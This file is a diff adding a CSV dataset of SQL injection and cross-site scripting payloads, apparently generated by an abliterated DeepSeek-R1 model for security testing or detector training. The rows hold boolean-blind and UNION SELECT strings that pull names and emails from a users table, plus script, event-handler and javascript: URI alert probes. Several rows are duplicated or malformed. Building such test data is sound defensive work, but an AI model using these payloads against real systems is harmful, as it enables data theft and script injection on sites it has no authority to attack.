@@ -1,0 +1,41 @@
+payload,attack_type,attack_family,seed,round,matched_rules,label,generator,model_tag,payload_sha256
+"1. ""AND 1=1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,3870004df6131fcca5daa8f2a88c00023dafa2367667b7c3d1cbd591bff0020f
+"2. ""AND (SELECT 1)=1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,517c74c366b179a17d9e0d6f3e925a63357a52e64bb84239c84178028e922316
+"3. ""AND 1=1 UNION SELECT 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,6bba51b1fc0df1c1457f029a5f3323e07b3485ae5c4cab77771f9633ae7d3960
+"4. ""AND 1=1 LIMIT 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,bace0ba12c6c43a5f52fbce710582c7d14b4ee16476ce6755d161b7e632afaa1
+"5. ""AND 1=1 OFFSET 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,02bc7b79dd1672de757b20949f095be4be29a86caf7340d8ceb92ef5d5517b6c
+"6. ""AND 1=1 ORDER BY 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,d93272e5beb2bf5ad31058b3361fa6c6e69f43b2f2b509058d86c76465cfce83
+"7. ""AND 1=1 LIMIT 1 OFFSET 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,500914defcd74b0f491cebb791fd87fd996923b18fc82fa2b00695237452f8af
+"8. ""AND 1=1 UNION SELECT 1 LIMIT 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,d33a9d270663b611ddcd342e7a82d7ac334883ac2ce30c475389075479f775c5
+"9. ""AND 1=1 UNION SELECT 1 ORDER BY 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,6f42cc1c7bbaa8fd6aa3664e6b20faf8c0b7fa48264195d7f71179a3378cd9cf
+"10. ""AND 1=1 UNION SELECT 1 LIMIT 1 OFFSET 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,950173fb3d7aa2c25f8a9ae8a1f4e2b2ea8a1f14982161986b250437a73675db
+"11. ""AND 1=1 UNION SELECT 1 ORDER BY 1 OFFSET 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,9b816e969fb1fbe7d49b1d0e52faa5893833689883674c1e3f0bd3f33f19375b
+"12. ""AND 1=1 UNION SELECT 1 LIMIT 1 OFFSET 1 ORDER BY 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,90fb4a421e110e2ac45706c5ce83ca310dd0bb2e6cd7b39e4a7a1834513b6867
+"13. ""AND 1=1 UNION SELECT 1 LIMIT 1 OFFSET 1 ORDER BY 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,97197c226b0064803680d8f162b7f723b11b044cb86b08246196515e697ab4a4
+"14. ""AND 1=1 UNION SELECT 1 LIMIT 1 OFFSET 1 ORDER BY 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,ef0b9427f811580423eb41176868025f4be2419be723c74af2efb26f8551e8b1
+"15. ""AND 1=1 UNION SELECT 1 LIMIT 1 OFFSET 1 ORDER BY 1""",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,35f94b192a6b05ac91d73e69678c5b6d0adf760652d23682cd8edb08e16f5b7e
+"16. ""AND 1=1 UNION SELECT 1",sqli,boolean_blind,42,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,8ba80874e9ac3e56acf93bfd3a4f20e8c73cf54a6b7e08e61251583f7c298abb
+'test' UNION (SELECT * FROM users),sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,0299a937de0a5bdac32361f471851bb235ffca21ec516c502755a52d8f10342e
+'test' UNION (SELECT name FROM users),sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,0c5c3bfafb23112f098dc9c56f4f38a611b233b30836dbfa94586a1f636c3209
+'test' UNION (SELECT email FROM users),sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,b6a145f0f9d33a918ad08bec4c7658a061bf68ab2cb8dc163882caccd7baea96
+'test' UNION (SELECT username FROM users),sqli,union_based,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,c2387b856f9069a0ccb212fe3e61c42b8e253283a7980149e1fe58a5f6b21153
+<script>alert('XSS');</script>,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,3972594bb8b2badc6e8029aeed45020aeb36ccce2baa46182ca2456d1c4f1d2c
+‘<script>alert('XSS');</script>’,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,162ec8c83c4f6ef5eb47b097c16c27e4f19a6b349ae22423c801326ed19af733
+“<script>alert('XSS');</script>”,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,6c0d22fb36d4882b0102aa8485be14fc8fa98915fccc14e572ee2c5a788a1a10
+《<script>alert('XSS');</script>》,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,f2ddc5416d2279bec069a6365697e59e823cb746bb9e291fd57d3446c1683eaa
+‹script›alert('XSS')‹/script›,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,e7afb93493f388acde77bc7f835db9400bc4c995770ebd33ad75e8f3fbcf5703
+onmouseover=’alert('XSS');’,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,cde90f8b71e493293201d1a492d2ca78fe9c0dd7307bcb3037b66e6495df2f80
+onmouseover=alert('XSS');,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,91acc28400f51ed008391753140db2c9fc98a3e9b499fb46ee8d4a430d485733
+src='javascript:alert('XSS');',xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,17a09716967d75eef6a1893669a67c9681c421a7459dd7a6e253699598c2e546
+onclick=’alert('XSS');’,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,d4ed3b0c0ff8a57d3792c35bcce678ac43d18782fe302ef817ec1fabee9d1198
+onclick=alert('XSS');,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,14f968a65441d1280f2dfa21f110c806e97a5d65194d43234d493088d2f5cf79
+onload=’alert('XSS');’,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,7fc0e4eb22b2c4a0f22463dd7546e6a80d2c7e56b195b7ca7295512a774834c7
+onload=alert('XSS');,xss,stored,43,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,f3167eb3099b7a80949ff813d50e991023a881996f8ea274b8e3dafffd0f66a4
+<div onclick='alert('xss')'>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,475ab68adb6900163d0c26d092ae7c3a223aa52cd504521fa597d7a2b67e581d
+<img src='x' onerror='alert('xss')'>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,24825f5b9c700822204752536f702824519ed97db9f0e1f008fba5528ad86ae2
+<span onmouseover='alert('xss')'>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,056011871e228584f4644b196485af46167986d1f1f84ba54d8475880190879b
+<a href='javascript:alert('xss')'>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,16b481b839bfa4cefe4cafc6fa6a3c458b7fe069e489c5d4202d1fb7c1ba144b
+<input type='button' onclick='alert('xss')'>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,6a37b2ef8875bbf9794be9508a7282e4b8212dd1dffab34504017750e6909664
+<div onclick='return confirm('xss')'>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,d00c9423e3599a8122cb42bec772f116b676665c3f9e10889f4aa2b1aa0836ad
+<div onclick='window.alert('xss')'>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,dc1e7f8cb8a8f20c111b19fa0432939f5f617246282eeb8d0ba3eb2ef7054770
+<div onclick='console.log('xss');'>,xss,dom_based,44,1,,1,deepseek-r1,huihui_ai/deepseek-r1-abliterated:14b-qwen-distill,5a670f14efb61c3c38ef1ca26646e89fb67308a8742db921aea1b4990b4e3188
